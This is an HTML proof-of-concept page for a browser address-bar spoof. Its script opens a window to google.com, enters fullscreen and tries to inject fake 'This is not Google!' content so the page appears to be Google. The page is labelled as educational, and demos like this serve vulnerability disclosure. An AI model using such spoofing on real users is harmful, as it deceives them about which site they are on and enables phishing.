<!DOCTYPE html> 
<html lang="en"> 
<head> 
  <meta charset="UTF-8" /> 
  <meta name="viewport" content="width=device-width, initial-scale=1" /> 
  <title>Browser Security Demo</title> 
  <style> 
    * { 
      margin: 0; 
      padding: 0; 
      box-sizing: border-box; 
    } 
 
    html, body { 
      width: 100%; 
      height: 100%; 
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
    } 
 
    body { 
      display: flex; 
      justify-content: center; 
      align-items: center; 
      flex-direction: column; 
      gap: 30px; 
      padding: 20px; 
    } 
 
    .container { 
      background: white; 
      padding: 40px; 
      border-radius: 12px; 
      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3); 
      max-width: 600px; 
      text-align: center; 
    } 
 
    h1 { 
      color: #333; 
      margin-bottom: 20px; 
      font-size: 28px; 
    } 
 
    .warning { 
      background: #fff3cd; 
      border: 2px solid #ffc107; 
      border-radius: 8px; 
      padding: 15px; 
      margin: 20px 0; 
      color: #856404; 
    } 
 
    .demo-button { 
      padding: 15px 30px; 
      font-size: 18px; 
      border-radius: 8px; 
      background-color: #667eea; 
      color: white; 
      border: none; 
      cursor: pointer; 
      box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4); 
      transition: all 0.3s ease; 
      margin: 10px; 
    } 
 
    .demo-button:hover { 
      background-color: #5568d3; 
      transform: translateY(-2px); 
      box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6); 
    } 
 
    .info { 
      background: #e7f3ff; 
      border-left: 4px solid #2196F3; 
      padding: 15px; 
      margin: 20px 0; 
      text-align: left; 
    } 
 
    .flag-hunt { 
      background: #f0f0f0; 
      padding: 20px; 
      border-radius: 8px; 
      margin-top: 20px; 
      font-family: monospace; 
    } 
 
    code { 
      background: #f4f4f4; 
      padding: 2px 6px; 
      border-radius: 3px; 
      font-family: monospace; 
    }

    .exit-fullscreen {
      position: fixed;
      top: 20px;
      right: 20px;
      padding: 10px 20px;
      background: rgba(255, 0, 0, 0.8);
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      display: none;
      z-index: 10000;
      font-size: 16px;
    }

    .exit-fullscreen:hover {
      background: rgba(255, 0, 0, 1);
    }
  </style> 
</head> 
<body> 
  <button class="exit-fullscreen" id="exitBtn" onclick="exitFullscreen()">Exit Fullscreen (ESC)</button>

  <div class="container"> 
    <h1>üîí Browser Security Demonstration</h1> 
     
    <div class="warning">
      ‚ö†Ô∏è Educational Purpose Only - This demonstrates browser security concepts
    </div>

    <button class="demo-button" onclick="safeDemo()">POC (with Fullscreen)</button> 
 
    <div class="flag-hunt"> 
      <strong>Browser Blank Address Bar Lead Spoof</strong><br>
      <small>Demonstrates fullscreen + window manipulation</small>
    </div> 
  </div> 
 
  <script> 
    function safeDemo() {
      // Request fullscreen first
    
      
      // Open a new window 
      let win = window.open("https://www.google.com/", "_blank"); 
       
      // Attempt to write content (will be blocked by modern browsers for cross-origin) 
      setTimeout(() => { 
        try { 
          enterFullscreen();
          win.document.write(` 
            <h1>This is not Google!</h1> 
            <p>This demonstrates browser security protections.</p>
          `); 
          win.document.close(); 
          console.log("‚úÖ Content injection succeeded (about:blank only)"); 
        } catch (e) { 
          console.warn("Blocked by browser protections:", e); 
          alert("Browser security blocked the injection (this is good!)"); 
        } 
      }, 50); 
    }

    function enterFullscreen() {
      const elem = document.documentElement;
      
      if (elem.requestFullscreen) {
        elem.requestFullscreen();
      } else if (elem.webkitRequestFullscreen) { /* Safari */
        elem.webkitRequestFullscreen();
      } else if (elem.msRequestFullscreen) { /* IE11 */
        elem.msRequestFullscreen();
      }
      
      // Show exit button
      document.getElementById('exitBtn').style.display = 'block';
    }

    function exitFullscreen() {
      if (document.exitFullscreen) {
        document.exitFullscreen();
      } else if (document.webkitExitFullscreen) { /* Safari */
        document.webkitExitFullscreen();
      } else if (document.msExitFullscreen) { /* IE11 */
        document.msExitFullscreen();
      }
    }

    // Hide exit button when fullscreen is exited
    document.addEventListener('fullscreenchange', function() {
      if (!document.fullscreenElement) {
        document.getElementById('exitBtn').style.display = 'none';
      }
    });

    document.addEventListener('webkitfullscreenchange', function() {
      if (!document.webkitFullscreenElement) {
        document.getElementById('exitBtn').style.display = 'none';
      }
    });
  </script> 
</body> 
</html>
